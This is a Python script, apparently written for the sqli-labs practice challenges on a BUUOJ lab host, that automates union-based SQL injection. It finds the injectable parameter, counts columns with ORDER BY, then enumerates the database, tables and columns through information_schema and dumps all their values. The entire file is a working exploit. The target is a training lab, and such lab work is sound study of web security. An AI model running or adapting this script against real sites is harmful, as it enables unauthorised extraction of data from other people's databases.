import re
import requests

# Less-1: ?id=1'
# Less-2: ?id=1')

# https://zhuanlan.zhihu.com/p/396365059

# 前提1：判断有注入点
payload1 = "?id=1'"
payload2 = "?id=-1'"


# 前提2：判断网页显示的数据表字段数量,联合查询条件：显示出的字段至少一个
def GetColumnsNum(url):
    i = 1
    while 1:
        test = url + payload1 + f"order by {i} --+"
        # 请求
        req = requests.get(test)
        req.encoding = 'gbk'
        # 得到网页的html
        html = req.text
        text = str(html)
        if "Unknown column" in text:
            break
        i += 1
    return i


# sql语句根据显示出的字段而定: 在sqlilab中是第一个字段id不会显示，显示的字段为“Your Login name”、“Your Password”,
# 我们把查询结果显示在Your Login name

# 获取数据库名
def GetDBName(url):
    db_name = ''
    test = url + payload2 + " union select 1,database(),3 from information_schema.schemata --+"
    # 请求
    req = requests.get(test)
    req.encoding = 'gbk'
    # 得到网页的html
    html = req.text
    text = str(html)
    # 正则匹配
    db_name = re.search("Your Login name:(.*?)<", text).group(1)
    return db_name


# 获取数据库表函数
def GetDBTables(url, table_schema):
    table_names = []
    # 一次获取一个
    for num in range(20):
        test = url + payload2 + f"union select 1,(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = '{table_schema}' limit {num},1),3 --+"
        # 请求
        # print(test)
        con = requests.get(test)
        con.encoding = 'gbk'
        # 得到网页的html
        html = con.text
        text = str(html)
        table_name = re.search("Your Login name:(.*?)<", text).group(1)
        if table_name == "":
            # num超过现有个数而没有结果，则break
            break
        table_names.append(table_name)
    return table_names


# 获取数据库表的字段函数
def GetDBColumns(url, db_name, table_name):
    column_names = []
    for num in range(20):
        test = url + payload2 + "union select 1,(select column_name from " \
                                f"information_schema.columns where table_schema='{db_name}' and table_name='{table_name}' limit {num},1),3--+ "
        # 请求
        # print(test)
        con = requests.get(test)
        # print(con.url)
        con.encoding = 'gbk'
        html = con.text
        # 得到网页的html
        text = str(html)
        column_name = re.search("Your Login name:(.*?)<", text).group(1)
        if column_name == "":
            # num超过现有个数而没有结果，则break
            break
        column_names.append(column_name)
    return column_names


# 获取表数据函数
def GetDBData(url, db_name, table_name, colunm_name):
    colunm_values = {}
    colunm_values[colunm_name] = []
    for num in range(20):
        test = url + payload2 + f" union select 1,(select {colunm_name} from {db_name}.{table_name} limit {num},1),3--+ "
        # 请求
        # print(test)
        con = requests.get(test)
        con.encoding = 'gbk'
        # 得到网页的html
        html = con.text
        text = str(html)
        column_value = re.search("Your Login name:(.*?)<", text).group(1)
        if column_value == "":
            # num超过现有个数而没有结果，则break
            break
        colunm_values[colunm_name].append(column_value)
    return colunm_values


def StartSqli(url):
    db_name = GetDBName(url)
    print(str(db_name))
    table_names = GetDBTables(url, db_name)
    print('-- ' + db_name + ':' + str(table_names))
    for table_name in table_names:
        column_names = GetDBColumns(url, db_name, table_name)
        print('---- ' + table_name + ':' + str(column_names))
        for column_name in column_names:
            column_values = GetDBData(url, db_name, table_name, column_name)
            print('------' + column_name + ':' + str(column_values[column_name]))


if __name__ == '__main__':
    url = "http://b41313c2-b36b-4cf6-8bd6-feddfc74739e.node4.buuoj.cn/Less-1/"
    StartSqli(url)
